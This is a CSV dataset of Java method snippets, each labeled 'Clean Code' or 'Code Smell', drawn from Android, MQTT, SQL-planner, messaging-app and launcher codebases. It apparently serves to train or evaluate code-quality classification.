text,label,text_label
"@Override public void onReceive(Context context,Intent intent){
switch (getResultCode()) {
case Activity.RESULT_OK:
    break;
case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
  Toast.makeText(context,""SMS generic failure, close app & upload logs."",Toast.LENGTH_SHORT).show();
if (BuildConfig.DEBUG) {
  int errorCode=intent.getIntExtra(""errorCode"",-1);
  if (errorCode != -1) {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Error code: "" + String.valueOf(errorCode));
  }
 else {
    MainBrowserScreen.rootLogger.log(Level.INFO,""Unknown Error code: -1. This should never happen!"");
  }
}
break;
case SmsManager.RESULT_ERROR_NO_SERVICE:
Toast.makeText(context,""SMS no service"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_NULL_PDU:
Toast.makeText(context,""SMS null PDU"",Toast.LENGTH_SHORT).show();
break;
case SmsManager.RESULT_ERROR_RADIO_OFF:
Toast.makeText(context,""SMS radio off - turn off airplane mode!"",Toast.LENGTH_SHORT).show();
break;
}
}",1,Code Smell
"private void logMQTTMessage(ChannelHandlerContext ctx,Object message,String direction){
  if (!(message instanceof MqttMessage)) {
    return;
  }
  MqttMessage msg=(MqttMessage)message;
  String clientID=NettyUtils.clientID(ctx.channel());
  MqttMessageType messageType=msg.fixedHeader().messageType();
switch (messageType) {
case CONNECT:
case CONNACK:
case PINGREQ:
case PINGRESP:
case DISCONNECT:
    LOG.info(""{} {} <{}>"",direction,messageType,clientID);
  break;
case SUBSCRIBE:
MqttSubscribeMessage subscribe=(MqttSubscribeMessage)msg;
LOG.info(""{} SUBSCRIBE <{}> to topics {}"",direction,clientID,subscribe.payload().topicSubscriptions());
break;
case UNSUBSCRIBE:
MqttUnsubscribeMessage unsubscribe=(MqttUnsubscribeMessage)msg;
LOG.info(""{} UNSUBSCRIBE <{}> to topics <{}>"",direction,clientID,unsubscribe.payload().topics());
break;
case PUBLISH:
MqttPublishMessage publish=(MqttPublishMessage)msg;
LOG.info(""{} PUBLISH <{}> to topics <{}>"",direction,clientID,publish.variableHeader().topicName());
break;
case PUBREC:
case PUBCOMP:
case PUBREL:
case PUBACK:
case UNSUBACK:
LOG.info(""{} {} <{}> packetID <{}>"",direction,messageType,clientID,messageId(msg));
break;
case SUBACK:
MqttSubAckMessage suback=(MqttSubAckMessage)msg;
final List<Integer> grantedQoSLevels=suback.payload().grantedQoSLevels();
LOG.info(""{} SUBACK <{}> packetID <{}>, grantedQoses {}"",direction,clientID,messageId(msg),grantedQoSLevels);
break;
}
}
",0,Clean Code
"public static List<Condition> geneEruptSearchCondition(EruptModel eruptModel,List<Condition> searchCondition){
  checkEruptSearchNotnull(eruptModel,searchCondition);
  List<Condition> legalConditions=new ArrayList<>();
  if (null != searchCondition) {
    for (    Condition condition : searchCondition) {
      EruptFieldModel eruptFieldModel=eruptModel.getEruptFieldMap().get(condition.getKey());
      if (null != eruptFieldModel) {
        Edit edit=eruptFieldModel.getEruptField().edit();
        EditTypeSearch editTypeSearch=AnnotationProcess.getEditTypeSearch(edit.type());
        if (null != editTypeSearch && editTypeSearch.value()) {
          if (edit.search().value() && null != condition.getValue()) {
            if (condition.getValue() instanceof Collection) {
              Collection<?> collection=(Collection<?>)condition.getValue();
              if (collection.size() == 0) {
                continue;
              }
            }
            if (edit.search().vague()) {
              condition.setExpression(editTypeSearch.vagueMethod());
            }
 else {
              condition.setExpression(QueryExpression.EQ);
            }
            legalConditions.add(condition);
          }
        }
      }
    }
  }
  return legalConditions;
}",0,Clean Code
"private void createPanel(final boolean indeterminate,final boolean showSeconds,final boolean showCancelButton,final boolean addBorder){
  setLayout(new BorderLayout());
  final JPanel pPb=new JPanel(new BorderLayout());
  pPb.setBorder(new TitledBorder(""""));
  if (m_description == null) {
    m_label.setVisible(false);
  }
 else {
    m_label.setText(convertTextToHtml(m_description));
  }
  pPb.add(m_label,BorderLayout.NORTH);
  m_progressBar.setIndeterminate(indeterminate);
  m_progressBar.setStringPainted(true);
  final JPanel borderPanel=new JPanel(new BorderLayout());
  if (addBorder) {
    borderPanel.setBorder(BorderFactory.createCompoundBorder(new LineBorder(Color.GRAY),new EmptyBorder(1,1,1,1)));
  }
  if (showCancelButton) {
    final JPanel buttonPanel=new JPanel(new BorderLayout());
    final JButton cancelButton=new JButton(new CancelAction());
    cancelButton.setFocusable(false);
    final JPanel paddingPanel=new JPanel(new BorderLayout());
    paddingPanel.setBorder(new EmptyBorder(0,1,0,0));
    paddingPanel.setMinimumSize(new Dimension(1,0));
    buttonPanel.add(paddingPanel,BorderLayout.WEST);
    buttonPanel.add(cancelButton,BorderLayout.EAST);
    borderPanel.add(buttonPanel,BorderLayout.EAST);
  }
  borderPanel.add(m_progressBar,BorderLayout.CENTER);
  pPb.add(borderPanel,BorderLayout.CENTER);
  if (indeterminate && showSeconds) {
    updateSecondsText();
    m_timer.setRepeats(true);
  }
  add(pPb,BorderLayout.NORTH);
}",0,Clean Code
"@NonNull public static RuleEntry unflattenFromString(@Nullable String packageName,@NonNull String ruleLine,boolean isExternal) throws IllegalArgumentException {
  StringTokenizer tokenizer=new StringTokenizer(ruleLine,""\t"");
  if (isExternal) {
    if (tokenizer.hasMoreElements()) {
      String newPackageName=tokenizer.nextElement().toString();
      if (packageName == null)       packageName=newPackageName;
      if (!packageName.equals(newPackageName)) {
        throw new IllegalArgumentException(""Invalid format: package names do not match."");
      }
    }
 else     throw new IllegalArgumentException(""Invalid format: packageName not found for external rule."");
  }
  if (packageName == null) {
    throw new IllegalArgumentException(""Package name cannot be empty."");
  }
  String name;
  RuleType type;
  if (tokenizer.hasMoreElements()) {
    name=tokenizer.nextElement().toString();
  }
 else   throw new IllegalArgumentException(""Invalid format: name not found"");
  if (tokenizer.hasMoreElements()) {
    try {
      type=RuleType.valueOf(tokenizer.nextElement().toString());
    }
 catch (    Exception e) {
      throw new IllegalArgumentException(""Invalid format: Invalid type"");
    }
  }
 else   throw new IllegalArgumentException(""Invalid format: entryType not found"");
  return getRuleEntry(packageName,name,type,tokenizer);
}
",0,Clean Code
"/** 
 * Returns default estimates for selectivities, in the absence of stats.
 * @param predicate predicate for which selectivity will be computed; nullmeans true, so gives selectity of 1.0
 * @return estimated selectivity
 */
public static double guessSelectivity(RexNode predicate){
  return guessSelectivity(predicate,false);
}
/** 
 * Returns default estimates for selectivities, in the absence of stats.
 * @param predicate      predicate for which selectivity will be computed;null means true, so gives selectity of 1.0
 * @param artificialOnly return only the selectivity contribution fromartificial nodes
 * @return estimated selectivity
 */
public static double guessSelectivity(RexNode predicate,boolean artificialOnly){
  double sel=1.0;
  if ((predicate == null) || predicate.isAlwaysTrue()) {
    return sel;
  }
  double artificialSel=1.0;
  for (  RexNode pred : RelOptUtil.conjunctions(predicate)) {
    if (pred.getKind() == SqlKind.IS_NOT_NULL) {
      sel*=.9;
    }
 else     if ((pred instanceof RexCall) && (((RexCall)pred).getOperator() == RelMdUtil.ARTIFICIAL_SELECTIVITY_FUNC)) {
      artificialSel*=RelMdUtil.getSelectivityValue(pred);
    }
 else     if (pred.isA(SqlKind.EQUALS)) {
      sel*=.15;
    }
 else     if (pred.isA(SqlKind.COMPARISON)) {
      sel*=.5;
    }
 else {
      sel*=.25;
    }
  }
  if (artificialOnly) {
    return artificialSel;
  }
 else {
    return sel * artificialSel;
  }
}",0,Clean Code
"@Override public boolean onOptionsItemSelected(@NonNull MenuItem item){
  int id=item.getItemId();
  if (id == R.id.action_refresh) {
    mModel.reload();
    return true;
  }
 else   if (id == R.id.action_shortcut) {
    Uri uri=mPathListAdapter.getCurrentUri();
    if (uri != null) {
      mModel.createShortcut(uri);
    }
    return true;
  }
 else   if (id == R.id.action_storage) {
    ThreadUtils.postOnBackgroundThread(() -> {
      ArrayMap<String,Uri> storageLocations=StorageUtils.getAllStorageLocations(mActivity);
      if (storageLocations.size() == 0) {
        mActivity.runOnUiThread(() -> {
          if (isDetached())           return;
          new MaterialAlertDialogBuilder(mActivity).setTitle(R.string.storage).setMessage(R.string.no_volumes_found).setNegativeButton(R.string.ok,null).show();
        }
);
        return;
      }
      Uri[] backupVolumes=new Uri[storageLocations.size()];
      CharSequence[] backupVolumesStr=new CharSequence[storageLocations.size()];
      for (int i=0; i < storageLocations.size(); ++i) {
        backupVolumes[i]=storageLocations.valueAt(i);
        backupVolumesStr[i]=new SpannableStringBuilder(storageLocations.keyAt(i)).append(""\n"").append(getSecondaryText(mActivity,getSmallerText(backupVolumes[i].getPath())));
      }
      mActivity.runOnUiThread(() -> {
        if (isDetached())         return;
        new SearchableItemsDialogBuilder<>(mActivity,backupVolumesStr).setTitle(R.string.storage).setOnItemClickListener((dialog,which,item1) -> {
          mModel.loadFiles(backupVolumes[which]);
          dialog.dismiss();
        }
).setNegativeButton(R.string.cancel,null).show();
      }
);
    }
);
    return true;
  }
 else   if (id == R.id.action_list_options) {
    FmListOptions listOptions=new FmListOptions();
    listOptions.setListOptionActions(mModel);
    listOptions.show(getChildFragmentManager(),FmListOptions.TAG);
    return true;
  }
 else   if (id == R.id.action_paste) {
    FmTasks.FmTask task=FmTasks.getInstance().dequeue();
    if (task != null) {
      startBatchPaste(task);
    }
    return true;
  }
 else   if (id == R.id.action_new_window) {
    Intent intent=new Intent(mActivity,FmActivity.class);
    if (!mModel.getOptions().isVfs) {
      intent.setDataAndType(mModel.getCurrentUri(),DocumentsContract.Document.MIME_TYPE_DIR);
    }
    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
    startActivity(intent);
    return true;
  }
 else   if (id == R.id.action_settings) {
    Intent intent=SettingsActivity.getIntent(requireContext(),""files_prefs"");
    startActivity(intent);
    return true;
  }
  return super.onOptionsItemSelected(item);
}",0,Clean Code
"public static <T>T newInstance(Class<T> clazz){
  try {
    Constructor<?> defaultConstructor=null;
    Constructor<?> otherConstructor=null;
    Constructor<?>[] declaredConstructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : declaredConstructors) {
      if (constructor.getParameterCount() == 0 && Modifier.isPublic(constructor.getModifiers())) {
        defaultConstructor=constructor;
      }
 else       if (Modifier.isPublic(constructor.getModifiers())) {
        otherConstructor=constructor;
      }
    }
    if (defaultConstructor != null) {
      return (T)defaultConstructor.newInstance();
    }
 else     if (otherConstructor != null) {
      Class<?>[] parameterTypes=otherConstructor.getParameterTypes();
      Object[] parameters=new Object[parameterTypes.length];
      for (int i=0; i < parameterTypes.length; i++) {
        if (parameterTypes[i].isPrimitive()) {
          parameters[i]=ConvertUtil.getPrimitiveDefaultValue(parameterTypes[i]);
        }
 else {
          parameters[i]=null;
        }
      }
      return (T)otherConstructor.newInstance(parameters);
    }
 else {
      Method factoryMethod=ClassUtil.getFirstMethod(clazz,m -> m.getParameterCount() == 0 && m.getReturnType().isAssignableFrom(clazz) && Modifier.isPublic(m.getModifiers()) && Modifier.isStatic(m.getModifiers()));
      if (factoryMethod != null) {
        return (T)factoryMethod.invoke(null);
      }
    }
    throw new IllegalArgumentException(""the class \"""" + clazz.getName() + ""\"" has no constructor."");
  }
 catch (  Exception e) {
    throw new RuntimeException(""Can not newInstance class: "" + clazz.getName(),e);
  }
}
public static <T>T newInstance(Class<T> clazz,Object... paras){
  try {
    Constructor<?>[] constructors=clazz.getDeclaredConstructors();
    for (    Constructor<?> constructor : constructors) {
      if (isMatchedParas(constructor,paras)) {
        Object ret=constructor.newInstance(paras);
        return (T)ret;
      }
    }
    throw new IllegalArgumentException(""Can not find constructor by paras: \"""" + Arrays.toString(paras) + ""\"" in class[""+ clazz.getName()+ ""]"");
  }
 catch (  Exception e) {
    throw new RuntimeException(e.toString(),e);
  }
}",1,Code Smell
"@Override public Version deserialize(JsonElement json,Type typeOfT,JsonDeserializationContext context) throws JsonParseException {
  JsonObject versionJson=json.getAsJsonObject();
  Version version=new Version();
  version.setAssetIndexInfo(context.deserialize(versionJson.get(""assetIndex""),Version.AssetIndexInfo.class));
  version.setAssets(versionJson.get(""assets"").getAsString());
  version.setDownloads(context.deserialize(versionJson.get(""downloads""),new TypeToken<Map<DownloadType,DownloadInfo>>(){
  }
.getType()));
  version.setId(versionJson.get(""id"").getAsString());
  version.setLibraries(context.deserialize(versionJson.get(""libraries""),Library[].class));
  version.setMainClass(versionJson.get(""mainClass"").getAsString());
  version.setReleaseTime(context.deserialize(versionJson.get(""releaseTime""),Date.class));
  version.setTime(context.deserialize(versionJson.get(""time""),Date.class));
  version.setType(context.deserialize(versionJson.get(""type""),ReleaseType.class));
  List<String> gameArguments=new ArrayList<>();
  List<String> jvmArguments=new ArrayList<>();
  int minimumLauncherVersion=versionJson.get(""minimumLauncherVersion"").getAsInt();
  if (minimumLauncherVersion < 21) {
    gameArguments.addAll(Arrays.asList(versionJson.get(""minecraftArguments"").getAsString().split("" "")));
    gameArguments.add(""--width"");
    gameArguments.add(""${resolution_width}"");
    gameArguments.add(""--height"");
    gameArguments.add(""${resolution_height}"");
    jvmArguments.add(""-Djava.library.path=${natives_directory}"");
    jvmArguments.add(""-Dminecraft.launcher.brand=${launcher_name}"");
    jvmArguments.add(""-Dminecraft.launcher.version=${launcher_version}"");
    jvmArguments.add(""-Dminecraft.client.jar=${primary_jar}"");
    jvmArguments.add(""-cp"");
    jvmArguments.add(""${classpath}"");
  }
 else {
    JsonObject argumentsJson=versionJson.get(""arguments"").getAsJsonObject();
    for (    JsonElement gameArgument : argumentsJson.get(""game"").getAsJsonArray()) {
      if (gameArgument.isJsonPrimitive()) {
        gameArguments.add(gameArgument.getAsString());
      }
 else {
        JsonObject optionalGameArgument=gameArgument.getAsJsonObject();
        JsonArray optionalGameArgumentRules=optionalGameArgument.get(""rules"").getAsJsonArray();
        JsonObject features=optionalGameArgumentRules.get(0).getAsJsonObject().get(""features"").getAsJsonObject();
        if (features.has(""has_custom_resolution"") && features.get(""has_custom_resolution"").getAsBoolean()) {
          for (          JsonElement value : optionalGameArgument.get(""value"").getAsJsonArray()) {
            gameArguments.add(value.getAsString());
          }
        }
      }
    }
    for (    JsonElement jvmArgument : argumentsJson.get(""jvm"").getAsJsonArray()) {
      if (jvmArgument.isJsonPrimitive()) {
        jvmArguments.add(jvmArgument.getAsString());
      }
 else {
      }
    }
  }
  version.setGameArguments(gameArguments.toArray(new String[0]));
  version.setJvmArguments(jvmArguments.toArray(new String[0]));
  return version;
}",1,Code Smell
"private ComponentPackageDOExample buildExample(ComponentPackageQueryCondition condition){
  ComponentPackageDOExample example=new ComponentPackageDOExample();
  ComponentPackageDOExample.Criteria criteria=example.createCriteria();
  if (Objects.nonNull(condition.getId())) {
    criteria.andIdEqualTo(condition.getId());
  }
  if (CollectionUtils.isNotEmpty(condition.getIdList())) {
    criteria.andIdIn(condition.getIdList());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (StringUtils.isNotBlank(condition.getComponentType())) {
    criteria.andComponentTypeEqualTo(condition.getComponentType());
  }
  if (StringUtils.isNotBlank(condition.getComponentName())) {
    criteria.andComponentNameEqualTo(condition.getComponentName());
  }
  if (StringUtils.isNotBlank(condition.getPackageCreator())) {
    criteria.andPackageCreatorEqualTo(condition.getPackageCreator());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersion())) {
    criteria.andPackageVersionEqualTo(condition.getPackageVersion());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  return example;
}
",0,Clean Code
"@Override protected String toEL(Integer depth,StringBuilder paramContext){
  checkMaxWaitSeconds();
  Integer sonDepth=depth == null ? null : depth + 1;
  StringBuilder sb=new StringBuilder();
  processWrapperTabs(sb,depth);
  sb.append(""WHEN("");
  processWrapperNewLine(sb,depth);
  for (int i=0; i < this.getElWrapperList().size(); i++) {
    if (i > 0) {
      sb.append("","");
      processWrapperNewLine(sb,depth);
    }
    sb.append(this.getElWrapperList().get(i).toEL(sonDepth,paramContext));
  }
  processWrapperNewLine(sb,depth);
  processWrapperTabs(sb,depth);
  sb.append("")"");
  if (this.any) {
    sb.append("".any(true)"");
  }
  if (this.ignoreError) {
    sb.append("".ignoreError(true)"");
  }
  if (StrUtil.isNotBlank(customThreadExecutor)) {
    sb.append(StrUtil.format("".threadPool(\""{}\"")"",customThreadExecutor));
  }
  if (CollectionUtil.isNotEmpty(mustExecuteList)) {
    if (this.any) {
      throw new IllegalArgumentException(""'.must()' and '.any()' can use in when component at the same time!"");
    }
    sb.append("".must("");
    for (int i=0; i < mustExecuteList.size(); i++) {
      if (i > 0) {
        sb.append("", "");
      }
      sb.append(StrUtil.format(""\""{}\"""",mustExecuteList.get(i)));
    }
    sb.append("")"");
  }
  processWrapperProperty(sb,paramContext);
  return sb.toString();
}",0,Clean Code
"/** 
 * @param serviceMetaDO
 * @param bindingResult
 * @return
 */
@PostMapping(""update"") @ResponseBody public TeslaBaseResult update(@Valid @RequestBody ServiceMetaDO serviceMetaDO,BindingResult bindingResult){
  if (bindingResult.hasErrors()) {
    return buildValidationResult(bindingResult);
  }
  ServiceMetaDO old=serviceMetaService.selectOne(serviceMetaDO.getServiceCode());
  if (null == old) {
    return buildExceptionResult(new Exception(""Cannot find serviceMetaDO, Please change service code.""));
  }
  int ret=serviceMetaService.update(serviceMetaDO);
  return buildSucceedResult(ret);
}
",0,Clean Code
"/** 
 * Does nothing with its argument. Returns whether it is ensured that the call produces a single value
 * @param call      the expression to evaluate
 * @return Whether it is ensured that the call produces a single value
 */
public static boolean isSingleValue(SqlCall call){
  if (call.getOperator() instanceof SqlAggFunction) {
    return true;
  }
 else   if (call.getOperator() instanceof SqlValuesOperator || call.getOperator() instanceof SqlRowOperator) {
    List<SqlNode> operands=call.getOperandList();
    if (operands.size() == 1) {
      SqlNode operand=operands.get(0);
      if (operand instanceof SqlLiteral) {
        return true;
      }
 else       if (operand instanceof SqlCall) {
        return isSingleValue((SqlCall)operand);
      }
    }
    return false;
  }
 else {
    boolean isScalar=true;
    for (    SqlNode operand : call.getOperandList()) {
      if (operand instanceof SqlLiteral) {
        continue;
      }
      if (!(operand instanceof SqlCall) || !Util.isSingleValue((SqlCall)operand)) {
        isScalar=false;
        break;
      }
    }
    return isScalar;
  }
}",1,Code Smell
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"public AppException(){
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=null;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode){
  this.errorCode=errorCode;
  this.errorMessage=errorCode.getDescription();
  this.errorData=null;
}
public AppException(String errorMessage){
  super(errorMessage);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(Throwable cause){
  super(cause);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=cause.toString();
  this.errorData=ExceptionUtils.getStackFrames(cause);
}
public AppException(String errorMessage,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=AppErrorCode.UNKNOWN_ERROR;
  this.errorMessage=errorMessage;
  this.errorData=ExceptionUtils.getStackFrames(cause);
}
public AppException(AppErrorCode errorCode,String errorMessage,Object errorData){
  super(errorMessage);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=errorData;
}
public AppException(AppErrorCode errorCode,String errorMessage){
  super(errorMessage);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode,String errorMessage,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=null;
}
public AppException(AppErrorCode errorCode,String errorMessage,Object errorData,Throwable cause){
  super(errorMessage,cause);
  this.errorCode=errorCode;
  this.errorMessage=errorMessage;
  this.errorData=errorData;
}
",0,Clean Code
"private void onStickerSetClicked(View view,TLRPC.TL_messages_stickerSet stickerSet,boolean remote){
  TLRPC.InputStickerSet inputStickerSet=null;
  if (remote) {
    TLRPC.TL_inputStickerSetShortName inputStickerSetShortName=new TLRPC.TL_inputStickerSetShortName();
    inputStickerSetShortName.short_name=stickerSet.set.short_name;
    inputStickerSet=inputStickerSetShortName;
  }
  StickersAlert stickersAlert=new StickersAlert(getParentActivity(),GroupStickersActivity.this,inputStickerSet,!remote ? stickerSet : null,null);
  boolean isSelected=((StickerSetCell)view).isChecked();
  stickersAlert.setCustomButtonDelegate(new StickersAlert.StickersAlertCustomButtonDelegate(){
    @Override public String getCustomButtonTextColorKey(){
      return isSelected ? Theme.key_dialogTextRed : Theme.key_featuredStickers_buttonText;
    }
    @Override public String getCustomButtonRippleColorKey(){
      return !isSelected ? Theme.key_featuredStickers_addButtonPressed : null;
    }
    @Override public String getCustomButtonColorKey(){
      return !isSelected ? Theme.key_featuredStickers_addButton : null;
    }
    @Override public String getCustomButtonText(){
      return LocaleController.getString(isSelected ? R.string.RemoveGroupStickerSet : R.string.SetAsGroupStickerSet);
    }
    @Override public boolean onCustomButtonPressed(){
      int row=layoutManager.findFirstVisibleItemPosition();
      int top=Integer.MAX_VALUE;
      RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findViewHolderForAdapterPosition(row);
      if (holder != null) {
        top=holder.itemView.getTop();
      }
      int prevIndex=selectedStickerSetIndex;
      if (isSelected) {
        selectedStickerSet=null;
        removeStickerSet=true;
      }
 else {
        selectedStickerSet=stickerSet;
        removeStickerSet=false;
      }
      updateSelectedStickerSetIndex();
      if (prevIndex != -1) {
        boolean found=false;
        if (!searching) {
          for (int i=0; i < listView.getChildCount(); i++) {
            View ch=listView.getChildAt(i);
            if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + prevIndex) {
              ((StickerSetCell)ch).setChecked(false,true);
              found=true;
              break;
            }
          }
        }
        if (!found) {
          listAdapter.notifyItemChanged(prevIndex);
        }
      }
      if (selectedStickerSetIndex != -1) {
        boolean found=false;
        if (!searching) {
          for (int i=0; i < listView.getChildCount(); i++) {
            View ch=listView.getChildAt(i);
            if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + selectedStickerSetIndex) {
              ((StickerSetCell)ch).setChecked(true,true);
              found=true;
              break;
            }
          }
        }
        if (!found) {
          listAdapter.notifyItemChanged(selectedStickerSetIndex);
        }
      }
      if (top != Integer.MAX_VALUE) {
        layoutManager.scrollToPositionWithOffset(row + 1,top);
      }
      if (searching) {
        searchItem.setSearchFieldText("""",false);
        actionBar.closeSearchField(true);
      }
      return true;
    }
  }
);
  stickersAlert.show();
}",1,Code Smell
"@Override public DataResult<Chart> queryExistent(ChartQueryParam param){
  EasyLambdaQueryWrapper<ChartDO> queryWrapper=new EasyLambdaQueryWrapper<>();
  queryWrapper.eq(ChartDO::getDeleted,YesOrNoEnum.NO.getLetter()).eqWhenPresent(ChartDO::getId,param.getId()).eqWhenPresent(ChartDO::getUserId,param.getUserId());
  IPage<ChartDO> page=getMapper().selectPage(new Page<>(1,1),queryWrapper);
  if (CollectionUtils.isEmpty(page.getRecords())) {
    throw new DataNotFoundException();
  }
  Chart data=chartConverter.do2model(page.getRecords().get(0));
  setDataSourceInfo(Lists.newArrayList(data));
  return DataResult.of(data);
}
@Override public DataResult<Chart> queryExistent(Long id){
  DataResult<Chart> dataResult=find(id);
  if (dataResult.getData() == null) {
    throw new DataNotFoundException();
  }
  return dataResult;
}",0,Clean Code
"/** 
 * 鍐欏缓琛ㄨ鍙ャ��
 * @param dataExchange
 * @param cn
 * @param columns
 * @param rs
 * @param quote
 * @param out
 * @param exportContext
 * @throws Throwable
 */
protected void writeCreationSql(SqlDataExport dataExchange,Connection cn,List<Column> columns,ResultSet rs,String quote,Writer out,IndexFormatDataExchangeContext exportContext) throws Throwable {
  out.write(""CREATE TABLE "");
  out.write(JdbcUtil.quoteIfNon(dataExchange.getTableName(),quote));
  out.write(LINE_SEPARATOR);
  out.write('(');
  out.write(LINE_SEPARATOR);
  PrimaryKey primaryKey=getDbMetaResolver().getPrimaryKey(cn,dataExchange.getTableName());
  List<String> filterPkNames=filterPrimaryColumnNames(primaryKey,columns);
  for (int i=0, len=columns.size(); i < len; i++) {
    Column column=columns.get(i);
    out.write(""  "");
    out.write(JdbcUtil.quote(column.getName(),quote));
    out.write(' ');
    out.write(column.getTypeName());
    if (column.getSize() > 0) {
      out.write('(');
      out.write(Integer.toString(column.getSize()));
      if (column.getDecimalDigits() > 0) {
        out.write(',');
        out.write(Integer.toString(column.getDecimalDigits()));
      }
      out.write(')');
    }
    if (!column.isNullable())     out.write("" NOT NULL"");
    if (i < len - 1)     out.write(',');
 else     if (i == len - 1 && !filterPkNames.isEmpty())     out.write(',');
    out.write(LINE_SEPARATOR);
  }
  if (!filterPkNames.isEmpty()) {
    out.write(""  "");
    out.write(""PRIMARY KEY ("");
    for (int i=0, len=filterPkNames.size(); i < len; i++) {
      out.write(JdbcUtil.quote(filterPkNames.get(i),quote));
      if (i < len - 1)       out.write(',');
    }
    out.write("")"");
    out.write(LINE_SEPARATOR);
  }
  out.write("");"");
  out.write(LINE_SEPARATOR);
  out.write(LINE_SEPARATOR);
}",1,Code Smell
